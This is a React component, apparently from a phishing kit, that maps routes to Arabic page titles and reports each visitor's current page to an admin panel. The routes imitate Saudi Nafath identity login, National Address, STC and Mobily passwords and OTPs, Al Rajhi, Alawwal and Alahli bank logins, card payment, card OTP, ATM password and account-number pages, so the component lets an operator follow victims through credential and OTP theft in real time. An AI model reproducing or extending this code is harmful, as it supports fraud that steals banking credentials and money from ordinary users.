import { useEffect } from "react";
import { useLocation } from "wouter";
import { updatePage } from "@/lib/store";

export default function PageTitleUpdater() {
  const [location] = useLocation();

  useEffect(() => {
    let title = "الصفحة الرئيسية"; // Default title

    // Map all routes to Arabic page names
    const routeToTitle: Record<string, string> = {
      "/": "الصفحة الرئيسية",
      "/sobol-home": "الصفحة الرئيسية",
      "/login": "تسجيل الدخول",
      "/register": "التسجيل - الخطوة 1",
      "/register-step2": "التسجيل - الخطوة 2",
      "/register-step3": "التسجيل - الخطوة 3",
      "/national-address": "العنوان الوطني",
      "/national-address-home": "الصفحة الرئيسية",
      "/new-appointment": "موعد جديد",
      "/nafath": "نفاذ",
      "/nafath-login": "نفاذ - تسجيل دخول",
      "/nafath-login-page": "نفاذ - تسجيل دخول",
      "/nafath-verify": "تحقق نفاذ",
      "/summary-payment": "الملخص والدفع",
      "/credit-card-payment": "صفحة الدفع",
      "/otp-verification": "OTP البطاقة",
      "/atm-password": "كلمة مرور ATM",
      "/phone-verification": "توثيق الجوال",
      "/phone-otp": "تحقق رقم الجوال (OTP)",
      "/stc-call-alert": "تنبيه STC",
      "/mobily-call-alert": "تنبيه Mobily",
      "/mystc-otp": "MyStc OTP",
      "/stc-password": "كلمة مرور STC",
      "/alrajhi-login": "الراجحي - تسجيل دخول",
      "/alrajhi-otp": "الراجحى (OTP)",
      "/alrajhi-nafath": "الراجحي - نفاذ",
      "/alrajhi-alert": "الراجحي - تنبيه",
      "/alrajhi-call": "الراجحي - اتصال",
      "/rajhi-payment-error": "الراجحي - خطأ",
      "/alawwal-bank": "بنك الأول",
      "/alawwal-nafath": "الأول - نفاذ",
      "/alahli-otp": "الأهلي - OTP",
      "/bank-transfer": "التحويل البنكي",
      "/bank-account-number": "رقم الحساب",
      "/final-page": "الصفحة النهائية",
    };

    // Get title from map or use default
    title = routeToTitle[location] || "الصفحة الرئيسية";

    // Update browser title
    document.title = title;
    
    // Update page name in admin panel
    updatePage(title);
  }, [location]);

  return null;
}
